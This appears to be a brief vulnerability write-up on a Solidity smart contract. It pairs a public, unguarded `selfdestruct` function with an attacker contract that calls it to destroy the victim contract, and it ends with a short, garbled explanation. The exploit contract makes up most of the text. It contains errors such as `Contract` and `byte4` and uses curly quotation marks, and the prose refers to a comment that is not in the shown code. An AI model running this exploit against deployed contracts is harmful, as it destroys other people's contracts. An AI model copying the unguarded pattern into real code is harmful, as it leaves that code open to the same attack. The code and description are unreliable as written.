## Vulnerable Code

```javascript
 function selfdestructs() payable public {
    		selfdestruct(owner);
}
```



## Exploit Code

```javascript
Contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“selfdestructs()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Let's look at the commant of '//Vulnerable position',the statement is not protected by any way.so if an malicious contract call the method -'selfdestructs'.In this situation, the victim contract can be destruct by any macious contract easily 
